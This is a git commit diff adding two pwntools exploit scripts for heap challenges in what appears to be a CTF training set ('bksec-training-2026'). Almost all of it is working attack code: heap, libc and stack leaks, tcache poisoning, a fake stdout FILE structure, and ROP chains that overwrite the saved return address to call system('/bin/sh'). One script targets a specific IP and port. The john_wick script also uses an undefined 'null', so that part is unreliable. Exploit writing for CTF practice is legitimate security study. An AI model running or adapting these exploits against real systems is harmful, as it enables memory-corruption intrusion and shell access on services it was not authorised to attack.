4678160bd4c1f99d6686d51b9592d028adba9886
m. duong <duongtuyetmai2802@gmail.com>
2026-05-09 02:02:38 +0700

    some heap challs in bksec training

--- bksec-training-2026/john_wick/script.py
+++ bksec-training-2026/john_wick/script.py
@@ -3,11 +3,12 @@ from pwn import *
 import binascii
 import sys
 
-exe_path = 'john_wick'
+exe_path = 'john_wick_patched'
 HOST = '103.77.175.40'
 PORT = 6121
 
 exe = ELF(exe_path, checksec=False)
+libc = exe.libc
 context.binary = exe
 context.terminal = [
     'cmd.exe', '/c', 'start',
@@ -19,7 +20,11 @@ context.terminal = [
 ]
 
 gdbscript = '''
-break *main
+brva 0x14dc
+brva 0x16b7
+brva 0x17cb
+brva 0x19d9
+brva 0x1ade
 continue
 '''
 
@@ -34,22 +39,105 @@ def start():
 
 p = start()
 
+def sla(prompt, data):
+    p.sendlineafter(prompt, data)
+def sa(prompt, data):
+    p.sendafter(prompt, data)
+def s(prompt):
+    p.send(prompt)
+def sl(data):
+    p.sendline(data)
+def rcu(data):
+    return p.recvuntil(data)
+def rl():
+    return p.recvline()
+
 # add payload, script here
-shellcode = asm('''
-    xor rax, rax
-    mov rdi, 0x68732f6e69622f
-    push rdi
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
-    mov al, 0x3b
-    syscall
-''')
+def add(idx, name, age, height, len_desc, desc, bksec_coin):
+    sla(b'> ', b'1')
+    sla(b'Index: ', str(idx).encode())
+    sa(b'Name: ', name)
+    sla(b'Age: ', str(age).encode())
+    sla(b'Height (cm): ', str(height).encode())
+    sla(b'Length of description: ', str(len_desc).encode()) # <= 0x100
+    sa(b'Description: ', desc)
+    if bksec_coin != null:
+        sla(b'6M$): ', str(bksec_coin).encode())
+def delete(idx):
+    sla(b'> ', b'2')
+    sla(b'Index: ', str(idx).encode())
+def view(idx):
+    sla(b'> ', b'3')
+    sla(b'Index: ', str(idx).encode())
+def change_status(idx, status): # max 0x20 bytes
+    sla(b'> ', b'4')
+    sla(b'Index: ', str(idx).encode())
+    sla(b'New status: ', status)
+def edit(idx, desc):
+    sla(b'> ', b'5')
+    sla(b'Index: ', str(idx).encode())
+    sa(b'New description: ', desc)
 
-my_shellcode = asm(shellcraft.sh()) # alternative shellcode /bin/sh
+# leak heap by overlapping
+add(0, b'A'*29, 20, 170, 0x37, b'B'*0x10, 0xe000)
+add(1, b'C'*29, 20, 170, 0x57, b'D'*0x10, 0xe000)
+delete(0)
+delete(1)
+add(0, b'E'*29, 20, 170, 0x57, b'\x00', 0xe000)
+change_status(0, b'S'*0x20)
+view(0)
+rcu(b'Description: ')
+heap_base = u64(p.recv(5).ljust(8, b'\x00')) << 12
 
-payload = my_shellcode.ljust(312, b'A')  # load shellcode and pad to buffer size
+# leak libc by free 8 chunks >= 0x90
+for i in range(0, 9, 1):
+    add(i+1, b'A' * 29, 20, 170, 0x87, b'B' * 0x10, 0xe000)
+for i in range(9, 2, -1):
+    delete(i)
+change_status(2, b'S' * 0x20)
+delete(2)
+view(1)
+rcu(b'Description: ')
+libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x203b20
 
-p.sendline(payload + p64(exe.symbols['win']+5))
+# leak stack via environ with fake stdout (tcache poisoning)
+fp = FileStructure()
+fp.write(libc.sym.environ, 0x8)
+fp.flags = 0xfbad1804
+payload = bytes(fp)[:0x30]
+print(fp)
+target = 0x2045c0 + libc.address
+
+log.success(f'heap base: {hex(heap_base)}')
+log.success(hex(libc.address))
+
+for i in range(2, 10, 1):
+    add(i, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)
+delete(2)
+delete(9)
+edit(1, p64(target ^ (heap_base >> 12)) + p64(0xdeadbeef))
+add(2, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)
+
+# leak stack
+add(9, b'A'*29, 20, 170, 0x87, payload, null)
+stack = u64((p.recv(6)).ljust(8,b'\x00')) - 0x148
+log.success(hex(stack))
+sleep(0.5)
+
+# overwrite saved rip with ROP
+sl(str(0xe000).encode())
+delete(3)
+delete(1)
+edit(2, p64(stack ^ (heap_base >> 12)) + p64(0xdeadbeef))
+add(1, b'A'*29, 20, 170, 0x87, b'B'*0x10, 0xe000)
+ret = libc.address + 0x000000000002882f
+pop_rdi = libc.address + 0x000000000010f78b
+binsh = next(libc.search(b'/bin/sh'))
+system = libc.sym.system
+payload = flat(
+    0x0, ret, pop_rdi, binsh, system # add saved rbp to prevent tcache unaligned (0x8)
+)
+add(3, b'A'*29, 20, 170, 0x87, payload, 0xe000)
+sl(b'ls -la')
 
 p.interactive()
--- bksec-training-2026/my_note/script.py
+++ bksec-training-2026/my_note/script.py
@@ -4,10 +4,11 @@ import binascii
 import sys
 
 exe_path = 'chall_patched'
-HOST = '103.77.175.40'
-PORT = 6110
+HOST = 'example.com'
+PORT = 1337
 
 exe = ELF(exe_path, checksec=False)
+libc = exe.libc
 context.binary = exe
 context.terminal = [
     'cmd.exe', '/c', 'start',
@@ -19,7 +20,7 @@ context.terminal = [
 ]
 
 gdbscript = '''
-break *main
+brva 0x1f04
 continue
 '''
 
@@ -34,22 +35,158 @@ def start():
 
 p = start()
 
-# add payload, script here
-shellcode = asm('''
-    xor rax, rax
-    mov rdi, 0x68732f6e69622f
-    push rdi
-    mov rdi, rsp
-    xor rsi, rsi
-    xor rdx, rdx
-    mov al, 0x3b
-    syscall
-''')
+def sla(prompt, data):
+    p.sendlineafter(prompt, data)
+def sa(prompt, data):
+    p.sendafter(prompt, data)
+def s(prompt):
+    p.send(prompt)
+def sl(data):
+    p.sendline(data)
+def rcu(data):
+    return p.recvuntil(data)
+def rl():
+    return p.recvline()
 
-my_shellcode = asm(shellcraft.sh()) # alternative shellcode /bin/sh
+# ============================EXPLOIT============================
+def register(name, username, password):
+    sla(b'Your choice: ', b'1')
+    sla(b' full name: ', name)
+    sla(b' username: ', username)
+    sla(b' password: ', password)
+def login(username, password):
+    sla(b'Your choice: ', b'2')
+    sla(b' username: ', username)
+    sla(b' password: ', password)
+def logout():
+    sla(b'Your choice: ', b'3')
+def note():
+    sla(b'Your choice: ', b'4')
+def add_note(title, content):
+    note()
+    sla(b'Your choice: ', b'1')
+    sla(b' title: ', title)
+    sla(b' content: ', content) # 0x100
+    sla(b'Your choice: ', b'5')
+def view_note():
+    note()
+    sla(b'Your choice: ', b'2')
+    
+def edit_note(title, content):
+    note()
+    sla(b'Your choice: ', b'3')
+    sla(b' note you want to edit: ', title)
+    sla(b' new content: ', content)
+    sla(b'Your choice: ', b'5')
+def delete_note(title):
+    note()
+    sla(b'Your choice: ', b'4')
+    sla(b' note you want to delete: ', title)
+    sla(b'Your choice: ', b'5')
+def profile():
+    sla(b'Your choice: ', b'5')
+def view_profile():
+    profile()
+    sla(b'Your choice: ', b'1')
+def edit_profile(option, content):
+    profile()
+    sla(b'Your choice: ', b'2')
+    if option == 1:
+        sla(b'Your choice: ', b'1')
+        sla(b' new full name: ', content)
+    elif option == 2:
+        sla(b'Your choice: ', b'2')
+        sla(b' new password: ', content)
+    sla(b'Your choice: ', b'3') # back pro5
+    sla(b'Your choice: ', b'3') # back menu
 
-payload = my_shellcode.ljust(312, b'A')  # load shellcode and pad to buffer size
+# set up heap
+register(b'A'*0x10, b'username', b'password1')
+login(b'username', b'password1')
+add_note(b'MOCK NOTE', b'DEADBEEF')
+logout()
+register(b'B'*0x10, b'username', b'password2')
+login(b'username', b'password2')
 
-p.sendline(payload + p64(exe.symbols['win']+5))
+# leak heap by overwriting note title
+for i in range(10):
+    add_note(f'Note {i}', b'C'*0x10)
+logout()
+login(b'username', b'password2')
+for i in range(7):
+    add_note(f'Note {i+10}', b'D'*0x10)
+logout()
 
+
+login(b'username', b'password1')
+view_note()
+rcu(b'Title: ')
+heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x2ae0
+
+# create new username to leak libc via unsorted bin
+sla(b'Your choice: ', b'5')
+logout()
+register(b'E' * 0x10, b'USERNAME1', b'PASSWORD1')
+login(b'USERNAME1', b'PASSWORD1')
+
+for i in range(9):
+    add_note(f'Note {i}', b'C'*0x10)
+
+for i in range(8, 0, -1):
+    delete_note(f'Note {i}')
+
+leak_libc = heap_base + 0x2fa0
+
+logout()
+
+# overwrite content pointer of first note -> another pointer to NOTE struct (NOTE 20)
+register(b'F'*0x10, b'username', b'password3')
+login(b'username', b'password3')
+for i in range(5):
+    add_note(f'Note {i+17}', b'G'*0x10)
+
+logout()
+login(b'username', b'password1')
+
+# edit content pointer of NOTE 20 via content pointer of NOTE 1 to leak libc
+edit_note(p64(heap_base + 0x2ae0), b'I'*0x20 + p64(leak_libc))
+view_note()
+
+rcu(b'Title: Note 19\nContent: ' + b'G'*0x10)
+rcu(b'Title: ' + b'I'*0x10)
+rcu(b'Content: ')
+libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x203b20 
+
+sla(b'Your choice: ', b'5')
+
+# edit content pointer of NOTE 20 via content pointer of NOTE 1 to leak stack
+
+edit_note(p64(heap_base + 0x2ae0), b'I'*0x20 + p64(libc.sym.environ))
+view_note()
+rcu(b'Title: Note 19\nContent: ' + b'G'*0x10)
+rcu(b'Title: ' + b'I'*0x10)
+rcu(b'Content: ')
+srip = u64(p.recv(6).ljust(8, b'\x00')) - 0x160
+
+log.success(hex(libc.address))
+log.success(hex(heap_base))
+log.success(hex(srip))
+
+
+sla(b'Your choice: ', b'5')
+
+pop_rdi = 0x000000000010f78b + libc.address
+ret = 0x000000000002882f + libc.address
+system = libc.sym.system
+binsh = next(libc.search(b'/bin/sh'))
+payload = flat(
+    ret, pop_rdi, binsh, system
+)
+
+# edit content pointer of NOTE 20 via content pointer of NOTE 1 to overwrite saved RIP with ROP
+
+edit_note(p64(heap_base + 0x2ae0), b'NOTE'.ljust(0x20, b'\x00') + p64(srip))
+edit_note(b'NOTE\x00', payload)
+
+sl(b'ls -la')
 p.interactive()
